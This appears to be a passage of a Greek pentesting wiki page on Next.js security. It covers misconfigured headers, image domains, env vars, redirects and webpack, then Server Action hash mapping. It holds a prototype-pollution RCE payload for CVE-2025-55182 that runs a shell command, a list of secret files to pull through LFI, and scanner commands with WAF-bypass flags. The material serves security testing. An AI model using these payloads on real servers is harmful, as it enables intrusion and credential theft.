- Επειδή οι επαληθευμένες σελίδες φορτώνουν πολλούς υπο-πόρους, πρόσθεσε το header σε κάθε αίτημα (π.χ., Burp Match/Replace με κενή συμβολοσειρά αντιστοίχησης) για να αποτρέψεις τα assets από το να ανακατευθύνονται.

### `next.config.js`

**Τοποθεσία:** Ριζικός φάκελος του έργου.

**Σκοπός:** Διαμορφώνει τη συμπεριφορά του Next.js, ενεργοποιώντας ή απενεργοποιώντας λειτουργίες, προσαρμόζοντας ρυθμίσεις webpack, ορίζοντας μεταβλητές περιβάλλοντος και ρυθμίζοντας διάφορα χαρακτηριστικά ασφαλείας.

**Κύριες ρυθμίσεις ασφαλείας:**

<details>

<summary>Κεφαλίδες ασφαλείας</summary>

Οι κεφαλίδες ασφαλείας ενισχύουν την ασφάλεια της εφαρμογής σας δίνοντας οδηγίες στα προγράμματα περιήγησης για το πώς να χειρίζονται το περιεχόμενο. Βοηθούν στη μείωση διαφόρων επιθέσεων όπως το Cross-Site Scripting (XSS), το Clickjacking και την ανίχνευση τύπου MIME:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Παραδείγματα:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Ρυθμίσεις Βελτιστοποίησης Εικόνων</summary>

Next.js βελτιστοποιεί τις εικόνες για καλύτερη απόδοση, αλλά λανθασμένες ρυθμίσεις μπορούν να οδηγήσουν σε ευπάθειες ασφαλείας, όπως το να επιτρέπουν σε μη αξιόπιστες πηγές να εισάγουν κακόβουλο περιεχόμενο.

**Κακό Παράδειγμα Διαμόρφωσης:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Πρόβλημα:**

- **`'*'`:** Επιτρέπει τη φόρτωση εικόνων από οποιαδήποτε εξωτερική πηγή, συμπεριλαμβανομένων μη αξιόπιστων ή κακόβουλων domains. Οι επιτιθέμενοι μπορούν να φιλοξενήσουν εικόνες που περιέχουν κακόβουλο payload ή περιεχόμενο που παραπλανά τους χρήστες.
- Ένα ακόμη πρόβλημα μπορεί να είναι η επιτρεπόμενη χρήση ενός domain **όπου ο καθένας μπορεί να ανεβάσει μια εικόνα** (όπως `raw.githubusercontent.com`)

**Πώς το εκμεταλλεύονται οι επιτιθέμενοι:**

Εισάγοντας εικόνες από κακόβουλες πηγές, οι επιτιθέμενοι μπορούν να εκτελέσουν phishing επιθέσεις, να εμφανίσουν παραπλανητικές πληροφορίες ή να εκμεταλλευτούν ευπάθειες σε βιβλιοθήκες απόδοσης εικόνων.

</details>

<details>

<summary>Αποκάλυψη μεταβλητών περιβάλλοντος</summary>

Manage sensitive information like API keys and database credentials securely without exposing them to the client.

#### a. Αποκάλυψη Ευαίσθητων Μεταβλητών

**Κακό Παράδειγμα Διαμόρφωσης:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for client
},
}
```
**Πρόβλημα:**

- **`SECRET_API_KEY`:** Χωρίς το πρόθεμα `NEXT_PUBLIC_`, το Next.js δεν εκθέτει μεταβλητές στον client. Ωστόσο, αν προστεθεί λανθασμένα ως πρόθεμα (π.χ. `NEXT_PUBLIC_SECRET_API_KEY`), γίνεται προσβάσιμο από τον client.

**Πώς το εκμεταλλεύονται οι επιτιθέμενοι:**

Εάν ευαίσθητες μεταβλητές εκτεθούν στον client, οι επιτιθέμενοι μπορούν να τις αποκτήσουν εξετάζοντας τον client-side code ή τα network requests, αποκτώντας μη εξουσιοδοτημένη πρόσβαση σε APIs, databases ή άλλες υπηρεσίες.

</details>

<details>

<summary>Ανακατευθύνσεις</summary>

Manage URL redirections and rewrites within your application, ensuring that users are directed appropriately without introducing open redirect vulnerabilities.

#### a. Open Redirect Vulnerability

**Παράδειγμα Κακής Διαμόρφωσης:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Πρόβλημα:**

- **Δυναμικός Προορισμός:** Επιτρέπει στους χρήστες να καθορίζουν οποιοδήποτε URL, επιτρέποντας επιθέσεις open redirect.
- **Εμπιστοσύνη στην είσοδο χρήστη:** Ανακατευθύνσεις προς URLs που παρέχονται από χρήστες χωρίς επικύρωση μπορούν να οδηγήσουν σε phishing, διάδοση malware, ή credential theft.

**Πώς οι επιτιθέμενοι το εκμεταλλεύονται:**

Οι επιτιθέμενοι μπορούν να δημιουργήσουν URLs που φαίνονται ότι προέρχονται από το domain σας αλλά ανακατευθύνουν τους χρήστες σε κακόβουλες ιστοσελίδες. Για παράδειγμα:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Χρήστες που εμπιστεύονται το αρχικό domain μπορεί να πλοηγηθούν ασυνείδητα σε επιβλαβείς ιστοσελίδες.

</details>

<details>

<summary>Διαμόρφωση Webpack</summary>

Προσαρμόστε τις ρυθμίσεις Webpack για την εφαρμογή Next.js σας, οι οποίες μπορεί ακούσια να εισάγουν ευπάθειες ασφαλείας εάν δεν χειριστούν προσεκτικά.

#### a. Έκθεση ευαίσθητων modules

**Κακό Παράδειγμα Διαμόρφωσης:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Πρόβλημα:**

- **Αποκάλυψη Ευαίσθητων Διαδρομών:** Η δημιουργία aliases για ευαίσθητους καταλόγους και η επιτρεπόμενη πρόσβαση από τον client-side μπορεί να προκαλέσει leak εμπιστευτικών πληροφοριών.
- **Πακετάρισμα Μυστικών:** Εάν ευαίσθητα αρχεία πακετάρονται για τον client, το περιεχόμενό τους γίνεται προσβάσιμο μέσω source maps ή επιθεωρώντας τον client-side κώδικα.

**Πώς οι επιτιθέμενοι το εκμεταλλεύονται:**

Οι επιτιθέμενοι μπορούν να έχουν πρόσβαση ή να ανακατασκευάσουν τη δομή καταλόγων της εφαρμογής, ενδεχομένως εντοπίζοντας και εκμεταλλευόμενοι ευαίσθητα αρχεία ή δεδομένα.

</details>

### `pages/_app.js` και `pages/_document.js`

#### **`pages/_app.js`**

**Σκοπός:** Επικαλύπτει το προεπιλεγμένο App component, επιτρέποντας global state, styles και layout components.

**Χρήσεις:**

- Ενσωμάτωση global CSS.
- Προσθήκη layout wrappers.
- Ενσωμάτωση βιβλιοθηκών διαχείρισης state.

**Παράδειγμα:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Σκοπός:** Αντικαθιστά το προεπιλεγμένο Document, επιτρέποντας την προσαρμογή των ετικετών `<html>` και `<body>`.

**Περιπτώσεις χρήσης:**

- Τροποποίηση των ετικετών `<html>` ή `<body>`.
- Προσθήκη meta tags ή προσαρμοσμένων scripts.
- Ενσωμάτωση γραμματοσειρών τρίτων.

**Παράδειγμα:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Custom Server (Προαιρετικό)

**Σκοπός:** Παρόλο που το Next.js έρχεται με έναν ενσωματωμένο server, μπορείτε να δημιουργήσετε έναν custom server για προηγμένες περιπτώσεις χρήσης όπως custom routing ή ενσωμάτωση με υπάρχουσες backend υπηρεσίες.

**Σημείωση:** Η χρήση custom server μπορεί να περιορίσει τις επιλογές ανάπτυξης, ειδικά σε πλατφόρμες όπως Vercel που βελτιστοποιούν για τον ενσωματωμένο server του Next.js.

**Παράδειγμα:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Επιπρόσθετες Αρχιτεκτονικές και Ζητήματα Ασφάλειας

### Μεταβλητές Περιβάλλοντος και Διαμόρφωση

**Σκοπός:** Διαχείριση ευαίσθητων πληροφοριών και ρυθμίσεων διαμόρφωσης εκτός του κώδικα.

**Καλές Πρακτικές:**

- **Use `.env` Files:** Αποθηκεύστε μεταβλητές όπως API keys σε `.env.local` (αποκλεισμένο από τον έλεγχο έκδοσης).
- **Access Variables Securely:** Χρησιμοποιήστε `process.env.VARIABLE_NAME` για πρόσβαση σε μεταβλητές περιβάλλοντος.
- **Never Expose Secrets on the Client:** Βεβαιωθείτε ότι οι ευαίσθητες μεταβλητές χρησιμοποιούνται μόνο από τον server.

**Παράδειγμα:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Σημείωση:** Για να περιορίσετε τις μεταβλητές μόνο στο server-side, παραλείψτε τις από το αντικείμενο `env` ή προθέστε `NEXT_PUBLIC_` για να τις εκθέσετε στο client.

### Χρήσιμα server artifacts για στόχευση μέσω LFI/download endpoints

Εάν βρείτε ένα path traversal ή download API σε εφαρμογή Next.js, στοχεύστε compiled artifacts που leak server-side secrets και auth logic:

- `.env` / `.env.local` για session secrets και provider credentials.
- `.next/routes-manifest.json` και `.next/build-manifest.json` για πλήρη λίστα routes.
- `.next/server/pages/api/auth/[...nextauth].js` για ανάκτηση της compiled NextAuth configuration (συχνά περιέχει fallback passwords όταν οι τιμές `process.env` δεν έχουν οριστεί).
- `next.config.js` / `next.config.mjs` για έλεγχο rewrites, redirects και middleware routing.

### Αυθεντικοποίηση και Εξουσιοδότηση

**Προσέγγιση:**

- **Session-Based Authentication:** Χρησιμοποιήστε cookies για τη διαχείριση των συνεδριών χρηστών.
- **Token-Based Authentication:** Εφαρμόστε JWTs για αυθεντικοποίηση χωρίς κατάσταση.
- **Third-Party Providers:** Ενσωματώστε OAuth providers (π.χ., Google, GitHub) χρησιμοποιώντας βιβλιοθήκες όπως `next-auth`.

**Πρακτικές Ασφαλείας:**

- **Secure Cookies:** Ορίστε τα attributes `HttpOnly`, `Secure` και `SameSite`.
- **Password Hashing:** Πάντα κάνετε hash τους κωδικούς πριν τους αποθηκεύσετε.
- **Input Validation:** Αποτρέψτε injection attacks επικυρώνοντας και καθαρίζοντας τις εισροές.

**Παράδειγμα:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Βελτιστοποίηση Απόδοσης

**Στρατηγικές:**

- **Βελτιστοποίηση Εικόνων:** Χρησιμοποιήστε το component `next/image` του Next.js για αυτόματη βελτιστοποίηση εικόνων.
- **Code Splitting:** Αξιοποιήστε τα dynamic imports για να διασπάσετε τον κώδικα και να μειώσετε τους χρόνους αρχικής φόρτωσης.
- **Caching:** Υλοποιήστε στρατηγικές caching για τις απαντήσεις API και τα στατικά assets.
- **Lazy Loading:** Φορτώστε components ή assets μόνο όταν χρειάζονται.

**Παράδειγμα:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Εντοπισμός (hash σε όνομα συνάρτησης μέσω source maps)

Το σύγχρονο Next.js χρησιμοποιεί “Server Actions” που εκτελούνται στον server αλλά καλούνται από τον client. Σε περιβάλλον παραγωγής αυτές οι κλήσεις είναι αδιαφανείς: όλα τα POSTs καταλήγουν σε ένα κοινό endpoint και διακρίνονται από ένα hash συγκεκριμένου build που αποστέλλεται στο header `Next-Action`. Παράδειγμα:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Όταν το `productionBrowserSourceMaps` είναι ενεργοποιημένο, τα minified JS chunks περιέχουν κλήσεις στο `createServerReference(...)` που leak αρκετή δομή (plus associated source maps) για να ανακτήσετε έναν χάρτη μεταξύ του action hash και του αρχικού ονόματος συνάρτησης. Αυτό σας επιτρέπει να μεταφράσετε τα hashes που παρατηρούνται στο `Next-Action` σε συγκεκριμένους στόχους όπως `deleteUserAccount()` ή `exportFinancialData()`.

### Προσέγγιση εξαγωγής (regex on minified JS + optional source maps)

Αναζητήστε τα downloaded JS chunks για `createServerReference` και εξαγάγετε το hash και το function/source symbol. Δύο χρήσιμα patterns:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Ομάδα 1: server action hash (40+ hex chars)
- Ομάδα 2: symbol ή path που μπορεί να επιλυθεί στο αρχικό όνομα της συνάρτησης μέσω του source map όταν υπάρχει

If the script advertises a source map (trailer comment `//# sourceMappingURL=<...>.map`), fetch it and resolve the symbol/path to the original function name.

### Πρακτική ροή εργασίας

- Παθητική ανακάλυψη κατά την πλοήγηση: καταγράψτε τα αιτήματα με `Next-Action` headers και URLs JS chunk.
- Κατεβάστε τα αναφερόμενα JS bundles και τα συνοδευτικά `*.map` αρχεία (όταν υπάρχουν).
- Τρέξτε το regex παραπάνω για να δημιουργήσετε ένα λεξικό hash↔name.
- Χρησιμοποιήστε το λεξικό για στοχευμένες δοκιμές:
  - Διαλογή βάσει ονόματος (π.χ., `transferFunds`, `exportFinancialData`).
  - Παρακολουθήστε την κάλυψη ανά builds με βάση το όνομα της συνάρτησης (hashes περιστρέφονται μεταξύ builds).

### Exercising hidden actions (template-based request)

Πάρτε ένα έγκυρο POST που παρατηρήθηκε στο proxy ως πρότυπο και αλλάξτε την τιμή `Next-Action` για να στοχεύσετε άλλη ανακαλυφθείσα action:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Αναπαραγωγή στο Repeater και τεστ των authorization, input validation και business logic για ενέργειες που διαφορετικά είναι μη προσβάσιμες.

### Burp automation

- NextjsServerActionAnalyzer (Burp extension) αυτοματοποιεί τα παραπάνω στο Burp:
- Σαρώνει το proxy history για JS chunks, εξάγει `createServerReference(...)` entries, και κάνει parse στα source maps όταν είναι διαθέσιμα.
- Διατηρεί ένα searchable hash↔function-name dictionary και αφαιρεί διπλότυπα ανάμεσα σε builds με βάση το function name.
- Μπορεί να εντοπίσει ένα έγκυρο template POST και να ανοίξει μια έτοιμη για αποστολή καρτέλα Repeater με το hash της στοχευόμενης ενέργειας αντικατεστημένο.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notes and limitations

- Απαιτεί το `productionBrowserSourceMaps` ενεργοποιημένο σε production για να ανακτήσει ονόματα από bundles/source maps.
- Η αποκάλυψη του function-name δεν αποτελεί από μόνη της ευπάθεια· χρησιμοποιήστε το για να καθοδηγήσετε την ανακάλυψη και να ελέγξετε την authorization κάθε ενέργειας.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments που εκθέτουν Server Actions στο `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** περιέχουν κρίσιμη server-side prototype pollution κατά την αποσειριοποίηση Flight chunks. Με το να κατασκευάσει `$` αναφορές μέσα σε ένα Flight payload, ένας επιτιθέμενος μπορεί να μεταπηδήσει από μολυσμένα prototypes σε αυθαίρετη εκτέλεση JavaScript και στη συνέχεια σε εκτέλεση εντολών OS μέσα στη διεργασία Node.js.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Αλυσίδα επίθεσης σε Flight chunks

1. **Prototype pollution primitive:** Set `"then": "$1:__proto__:then"` έτσι ώστε ο resolver να γράψει μια `then` function στο `Object.prototype`. Κάθε απλό αντικείμενο που επεξεργάζεται στη συνέχεια γίνεται thenable, επιτρέποντας στον επιτιθέμενο να επηρεάσει τον async control flow μέσα στα RSC internals.
2. **Rebinding to the global `Function` constructor:** Point `_response._formData.get` at `"$1:constructor:constructor"`. Κατά την resolution, `object.constructor` → `Object`, και `Object.constructor` → `Function`, οπότε μελλοντικές κλήσεις σε `_formData.get()` εκτελούν στην πραγματικότητα `Function(...)`.
3. **Code execution via `_prefix`:** Τοποθετήστε JavaScript source στο `_response._prefix`. Όταν το μολυσμένο `_formData.get` κληθεί, το framework αξιολογεί `Function(_prefix)(...)`, οπότε το εγχυμένο JS μπορεί να τρέξει `require('child_process').exec()` ή οποιοδήποτε άλλο Node primitive.

#### Σκελετός payload
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Χαρτογράφηση της έκθεσης των React Server Functions

Οι React Server Functions (RSF) είναι οποιεσδήποτε συναρτήσεις που περιλαμβάνουν την οδηγία `'use server';`. Κάθε form action, mutation ή fetch helper δεσμευμένο σε μία από αυτές τις συναρτήσεις γίνεται RSC Flight endpoint που θα αποσειριοποιήσει attacker-supplied payloads. Χρήσιμα βήματα αναγνώρισης που προκύπτουν από αξιολογήσεις React2Shell:

- **Στατική καταγραφή:** αναζητήστε την οδηγία για να κατανοήσετε πόσες RSFs εκτίθενται αυτόματα από το framework.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` ενεργοποιεί την App Router + `app/` directory από προεπιλογή, που αθόρυβα μετατρέπει κάθε route σε endpoint ικανό για RSC. Τα assets του App Router όπως `/_next/static/chunks/app/` ή οι απαντήσεις που stream-άρουν Flight chunks πάνω από `text/x-component` είναι ισχυρά Internet-facing fingerprints.
- **Implicitly vulnerable RSC deployments:** Η ίδια η advisory της React επισημαίνει ότι εφαρμογές που αποστέλλουν το RSC runtime μπορεί να είναι exploitable **even without explicit RSFs**, οπότε θεωρήστε κάθε build που χρησιμοποιεί `react-server-dom-*` 19.0.0–19.2.0 ως ύποπτο.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. επαναχρησιμοποιούν τον ίδιο serializer και κληρονομούν την ίδια απομακρυσμένη επιφάνεια επίθεσης μέχρι να ενσωματώσουν patched React builds.

#### Κάλυψη εκδόσεων (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **ευάλωτα** στις 19.0.0, 19.1.0–19.1.1 και 19.2.0· **επιδιορθωμένα** στις 19.0.1, 19.1.2 και 19.2.1 αντίστοιχα.
- **Next.js stable:** Οι App Router releases 15.0.0–16.0.6 ενσωματώνουν το ευάλωτο RSC stack. Τα patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 περιλαμβάνουν fixed deps, οπότε οποιοδήποτε build κάτω από αυτές τις εκδόσεις είναι υψηλής αξίας.
- **Next.js canary:** `14.3.0-canary.77+` επίσης περιλαμβάνει το buggy runtime και προς το παρόν δεν υπάρχουν patched canary drops, καθιστώντας αυτά τα fingerprints ισχυρούς υποψήφιους προς εκμετάλλευση.

#### Απομακρυσμένο detection oracle

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) στέλνει ένα specially crafted multipart Flight request σε υποψήφιες διαδρομές και παρακολουθεί τη συμπεριφορά στο server-side:

- **Default mode** εκτελεί ένα deterministic RCE payload (μια μαθηματική πράξη που αντανακλάται μέσω `X-Action-Redirect`) αποδεικνύοντας εκτέλεση κώδικα.
- **`--safe-check` mode** σκοπίμως αλλοιώνει το Flight μήνυμα έτσι ώστε patched servers να επιστρέφουν `200/400`, ενώ ευάλωτοι στόχοι εκπέμπουν `HTTP/500` απαντήσεις που περιέχουν το substring `E{"digest"` μέσα στο σώμα. Αυτό το ζευγάρι `(500 + digest)` είναι προς το παρόν το πιο αξιόπιστο remote oracle που έχουν δημοσιεύσει οι defenders.
- Τα built-in `--waf-bypass`, `--vercel-waf-bypass`, και `--windows` switches προσαρμόζουν τη διάταξη του payload, προσθέτουν junk στην αρχή, ή ανταλλάσσουν εντολές OS ώστε να μπορείτε να δοκιμάσετε πραγματικά Internet assets.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
## Αναφορές

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)

{{#include ../../banners/hacktricks-training.md}}
